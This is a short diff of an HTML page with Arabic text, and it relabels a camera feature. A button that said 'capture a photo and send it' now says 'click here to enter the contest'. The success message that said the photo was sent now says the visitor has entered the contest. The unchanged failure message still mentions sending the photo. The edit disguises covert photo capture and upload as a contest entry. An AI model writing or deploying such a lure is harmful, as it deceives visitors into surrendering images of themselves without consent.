@@ -34,7 +34,7 @@
     </style>
 </head>
 <body>
-    <button id="captureBtn">التقاط صورة وإرسالها</button>
+    <button id="captureBtn">اضغط هنا للدخول الى المسابقة</button>
     <div id="status"></div>
 
     <script>
@@ -76,7 +76,7 @@
                 const data = await response.json();
                 
                 if (data.ok) {
-                    showStatus('تم إرسال الصورة بنجاح!', 'success');
+                    showStatus('.تم دخولك المسابقة بنجاح!', 'success');
                 } else {
                     showStatus('فشل في إرسال الصورة', 'error');
                 }
